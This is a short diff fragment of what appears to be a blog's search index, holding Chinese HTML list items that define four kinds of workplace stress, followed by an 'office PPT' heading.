+<li>职业发展压力指因为工作对能力要求超过本身或觉得工作没有挑战性</li>
+<li>角色扮演压力指因为工作角色与其他生活角色冲突或不清楚工作角色</li>
+<li>人际关系压力指与上司、同事或部署间的人际关系紧张</li>
+<li>组织环境压力指因为某些管理制度不认同或组织文化与自己有落差或工作环境不良</li>
+</ul>
+<h2 id="office-PPT"><a href="#office-PPT" class="headerlink" title="office PPT"></a>office PPT</h2>]]></content>
   </entry>
 </search>
